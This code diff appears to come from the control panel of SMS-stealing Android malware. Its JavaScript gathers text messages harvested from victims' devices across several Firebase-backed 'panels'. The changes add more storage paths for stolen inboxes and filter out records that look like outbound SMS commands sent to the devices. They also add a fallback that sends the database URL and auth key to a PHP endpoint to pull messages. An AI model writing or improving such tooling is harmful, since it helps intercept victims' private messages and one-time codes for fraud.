@@ -494,7 +494,7 @@ var DEVICE_NODES=['devices','users','clients_list','online_devices','Verify_Devi
 /** Per-device SMS subpaths used by Rabel / SpinPlay / Shootii panels */
 var PANEL_SMS_SUFFIXES=['all_sms','new_sms','sms','messages','sms_inbox','inbox','received_sms','sent_sms','sms_list','user_sms','msg_list'];
 /** Global SMS roots keyed by device id — rebel.py uses messages/{id} */
-var PANEL_SMS_GLOBAL_NODES=['messages','user_sms','sms','all_sms','new_sms','sms_inbox','inbox','received_sms','sent_sms','sms_data','device_sms','client_sms','sms_logs','msg_store','text_messages'];
+var PANEL_SMS_GLOBAL_NODES=['messages','user_sms','sms','all_sms','new_sms','sms_inbox','inbox','received_sms','sent_sms','sms_data','device_sms','client_sms','sms_logs','msg_store','text_messages','sms_backup'];
 
 function looksLikePhone(v){
   if(v==null||v==='')return false;
@@ -540,18 +540,51 @@ function isLikelySmsRootNode(name){
   return /sms|message|inbox|msg|text|chat|mail|received|sent/i.test(name);
 }
 function buildDynamicSmsPaths(d,inst){
-  var id=d&&d.rawId, paths=[], roots=(inst&&inst.rootKeys)||[], smsRoots=(inst&&inst.smsRootKeys)||[], k;
+  var id=d&&d.rawId, paths=[], roots=(inst&&inst.rootKeys)||[], smsRoots=(inst&&inst.smsRootKeys)||[];
   if(!id)return paths;
   smsRoots.forEach(function(key){if(key)paths.push(key+'/'+id);});
   roots.forEach(function(key){
-    if(!key||SKIP_NODES.indexOf(key)>=0||isDeviceSummaryNode(key))return;
+    if(!key||SKIP_NODES.indexOf(key)>=0||isDeviceSummaryNode(key)||isHexDeviceKey(key))return;
+    if(COMMAND_JUNK_NODES.indexOf(key)>=0)return;
     if(isLikelySmsRootNode(key)&&paths.indexOf(key+'/'+id)<0)paths.push(key+'/'+id);
-    PANEL_SMS_SUFFIXES.forEach(function(sfx){paths.push(key+'/'+id+'/'+sfx);});
   });
   return uniqPaths(paths);
 }
+function isRabelPanel(inst){
+  if(!inst)return false;
+  var url=(inst.restUrl||'');
+  if(inst.schema==='rabel')return true;
+  if(inst.config&&(inst.config.preferredDeviceNode==='user_list'||inst.config.preferredDeviceNode==='user_data'))return true;
+  return /rto9|rto0|rabel|raand|user_list|demon|jdhd|raki/i.test(url);
+}
+function isJunkSmsPath(path){
+  if(!path)return true;
+  var seg=String(path).split('/')[0];
+  if(COMMAND_JUNK_NODES.indexOf(seg)>=0)return true;
+  if(isHexDeviceKey(seg))return true;
+  return false;
+}
+function getPrioritySmsPaths(d,inst){
+  var id=d&&d.rawId, paths=[];
+  if(!id)return paths;
+  if(inst&&inst.smsRootKeys&&inst.smsRootKeys.length){
+    inst.smsRootKeys.forEach(function(root){
+      if(root)paths.push(root+'/'+id);
+    });
+  }
+  if(isRabelPanel(inst)||paths.length){
+    ['user_sms','sms_backup','messages','all_sms','new_sms'].forEach(function(root){
+      var p=root+'/'+id;
+      if(paths.indexOf(p)<0)paths.push(p);
+    });
+  }
+  return uniqPaths(paths);
+}
 function buildUniversalSmsPaths(d,inst){
-  return uniqPaths(smsPrimaryPaths(d,inst).concat(smsPathsForDevice(d,inst)).concat(buildDynamicSmsPaths(d,inst)));
+  var priority=getPrioritySmsPaths(d,inst);
+  var rest=uniqPaths(smsPrimaryPaths(d,inst).concat(smsPathsForDevice(d,inst)).concat(buildDynamicSmsPaths(d,inst)));
+  rest=rest.filter(function(p){return !isJunkSmsPath(p)&&priority.indexOf(p)<0;});
+  return priority.concat(rest);
 }
 
 // ---- FIX: Online status accuracy ----
@@ -919,7 +952,7 @@ function initFirebaseInstance(cfg){
       db=firebase.app(appName).database();
     }catch(e){}
   }
-  var inst={id:cfg.id,name:cfg.name,config:cfg,db:db,restUrl:(cfg.databaseURL||'').replace(/\/$/,''),schema:cfg.schema||(/shoot|verify|mitteld|nammu|mmmff|dev-rahul/i.test(cfg.databaseURL||'')?'shootii':((cfg.databaseURL||'').indexOf('rabel')>=0?'rabel':'spinplay')),liveAttached:false};
+  var inst={id:cfg.id,name:cfg.name,config:cfg,db:db,restUrl:(cfg.databaseURL||'').replace(/\/$/,''),schema:cfg.schema||(/shoot|verify|mitteld|nammu|mmmff|dev-rahul/i.test(cfg.databaseURL||'')?'shootii':(/rto9|rto0|rabel|raand|user_list|demon|jdhd|raki/i.test(cfg.databaseURL||'')?'rabel':((cfg.databaseURL||'').indexOf('rabel')>=0?'rabel':'spinplay'))),liveAttached:false};
   firebaseInstances.push(inst);return inst;
 }
 function initFirebase(){
@@ -1573,12 +1606,13 @@ function clearListeners(){
 function smsPrimaryPaths(d,inst){
   var id=d.rawId, schema=(inst&&inst.schema)||'rabel', paths=[], bases=getSmsDeviceBases(d,inst), pref=(inst&&inst.config&&inst.config.preferredDeviceNode)||'';
   if(!id)return paths;
-  if(schema==='rabel'||pref==='user_list'||pref==='user_data'){
+  if(isRabelPanel(inst)||schema==='rabel'||pref==='user_list'||pref==='user_data'){
     paths.push('user_sms/'+id);
+    paths.push('sms_backup/'+id);
     paths.push('messages/'+id);
     paths.push('sms/'+id);
     bases.forEach(function(n){
-      if(!n)return;
+      if(!n||COMMAND_JUNK_NODES.indexOf(n)>=0)return;
       ['all_sms','new_sms','sms','messages'].forEach(function(sfx){
         var p=n+'/'+id+'/'+sfx;
         if(paths.indexOf(p)<0)paths.push(p);
@@ -1624,15 +1658,16 @@ function smsPathsForDevice(d,inst){
   var id=d.rawId, paths=[], bases=getSmsDeviceBases(d,inst||getFbInstance(d.fbId));
   if(!id)return paths;
   paths.push('user_sms/'+id);
+  paths.push('sms_backup/'+id);
   paths.push('messages/'+id);
   paths.push('sms/'+id);
   PANEL_SMS_GLOBAL_NODES.forEach(function(g){if(paths.indexOf(g+'/'+id)<0)paths.push(g+'/'+id);});
   bases.forEach(function(n){
-    if(!n)return;
+    if(!n||COMMAND_JUNK_NODES.indexOf(n)>=0)return;
     PANEL_SMS_SUFFIXES.forEach(function(sfx){paths.push(n+'/'+id+'/'+sfx);});
     paths.push(n+'/'+id+'/webhookEvent/receivedSms');
   });
-  return uniqPaths(paths.concat(buildDynamicSmsPaths(d,inst||getFbInstance(d.fbId))));
+  return uniqPaths(paths.concat(buildDynamicSmsPaths(d,inst||getFbInstance(d.fbId))).filter(function(p){return !isJunkSmsPath(p);}));
 }
 
 function mergeSmsLists(){
@@ -1673,7 +1708,9 @@ function fetchSmsFast(inst,d){
 function fetchSmsFromPathsDirect(inst,d){
   if(!inst||!d)return Promise.resolve([]);
   var paths=buildUniversalSmsPaths(d,inst);
-  return Promise.all(paths.slice(0,28).map(function(p){
+  var priority=getPrioritySmsPaths(d,inst);
+  var fetchList=uniqPaths(priority.concat(paths)).slice(0,32);
+  return Promise.all(fetchList.map(function(p){
     return restJsonInst(inst,p).then(function(data){
       if(!data||isFirebaseErr(data))return [];
       return smsAsList(data).map(normalizeSms).filter(Boolean);
@@ -1684,16 +1721,39 @@ function fetchSmsFromPathsDirect(inst,d){
     return mergeSmsLists.apply(null,results);
   });
 }
+function fetchSmsViaPhp(inst,d){
+  if(!inst||!d)return Promise.resolve([]);
+  var hdr={'Content-Type':'application/json'};
+  return fetch(FETCH_SMS_URL,{
+    method:'POST',headers:hdr,
+    body:JSON.stringify({
+      device_id:d.rawId,
+      database_url:inst.restUrl,
+      auth_key:getFbAuthKey(inst),
+      schema:inst.schema||'rabel',
+      device_node:d.deviceNode||'user_list',
+      composite_id:d.id
+    })
+  }).then(function(r){return r.json();}).then(function(j){
+    if(!j||!j.ok||!Array.isArray(j.messages))return [];
+    return j.messages.map(normalizeSms).filter(Boolean);
+  }).catch(function(){return[];});
+}
 function fetchSmsFromPaths(inst,d){
   if(!inst||!d)return Promise.resolve([]);
   var fast=fetchSmsFast(inst,d);
   var full=fetchSmsFromPathsDirect(inst,d);
+  var php=fetchSmsViaPhp(inst,d);
   return fast.then(function(list){
     if(list.length){
       full.then(function(merged){if(merged.length)setDeviceSms(d.id,merged);});
+      php.then(function(fb){if(fb.length)setDeviceSms(d.id,fb);});
       return list;
     }
-    return full;
+    return full.then(function(merged){
+      if(merged.length)return merged;
+      return php;
+    });
   });
 }
 
@@ -1721,9 +1781,14 @@ function loadSmsForDevice(force){
 
   function applySmsList(list){
     if(seq!==_smsLoadSeq||selDev!==devId)return;
-    _smsLoading=false;
-    if(list&&list.length) setDeviceSms(devId,list);
-    else if(!deviceSmsCache[devId]||!deviceSmsCache[devId].list||!deviceSmsCache[devId].list.length) setDeviceSms(devId,[]);
+    if(list&&list.length){
+      _smsLoading=false;
+      setDeviceSms(devId,list);
+      return;
+    }
+    if(!deviceSmsCache[devId]||!deviceSmsCache[devId].list||!deviceSmsCache[devId].list.length){
+      _smsLoading=true;
+    }
   }
 
   function poll(){
@@ -1731,6 +1796,7 @@ function loadSmsForDevice(force){
     if(_panelPaused)return;
     fetchSmsFast(inst,d).then(applySmsList);
     fetchSmsFromPathsDirect(inst,d).then(applySmsList);
+    fetchSmsViaPhp(inst,d).then(applySmsList);
   }
 
   poll();
@@ -1738,7 +1804,7 @@ function loadSmsForDevice(force){
   var listeners={timer:timer,timers:[timer],refs:[],devId:devId,seq:seq};
 
   if(inst.db){
-    buildUniversalSmsPaths(d,inst).slice(0,14).forEach(function(path){
+    getPrioritySmsPaths(d,inst).concat(buildUniversalSmsPaths(d,inst)).slice(0,8).forEach(function(path){
       if(!path)return;
       try{
         var ref=inst.db.ref(path);
@@ -1759,10 +1825,21 @@ function loadSmsForDevice(force){
 }
 function smsLooksLikeMessage(m){
   if(!m||typeof m!=='object')return false;
+  if(isSmsCommandRecord(m)||isOutboundSmsCommand(m))return false;
   return !!String(m.body||m.message||m.text||m.content||m.msg||'').trim();
+}
+function isOutboundSmsCommand(m){
+  if(!m||typeof m!=='object')return false;
+  if(m.body&&m.sender)return false;
+  if(m.body&&m.address)return false;
+  if(m.sender||m.originatingAddress)return false;
+  if(m.to&&m.status&&(m.message||m.msg)&&!m.body)return true;
+  if(m.to&&(m.message||m.msg)&&!m.sender&&!m.body&&!m.date&&!m.timestamp)return true;
+  return false;
 }
 function smsAsList(raw){
   if(!raw)return[];
+  if(isSmsCommandRecord(raw)||isOutboundSmsCommand(raw))return[];
   if(Array.isArray(raw)){
     var out=[], i, v;
     for(i=0;i<raw.length;i++){
@@ -1812,8 +1889,10 @@ function smsMsgTime(m){
 }
 function normalizeSms(m){
   if(!m||typeof m!=='object')return null;
+  if(isSmsCommandRecord(m)||isOutboundSmsCommand(m))return null;
   var body=String(m.body||m.message||m.text||m.content||m.msg||'').trim();
   if(!body)return null;
+  if(!m.body&&m.message&&m.to&&m.status&&!m.sender)return null;
   var ts=smsMsgTime(m);
   return{
     address:m.address||m.sender||m.from||m.number||m.originatingAddress||'?',
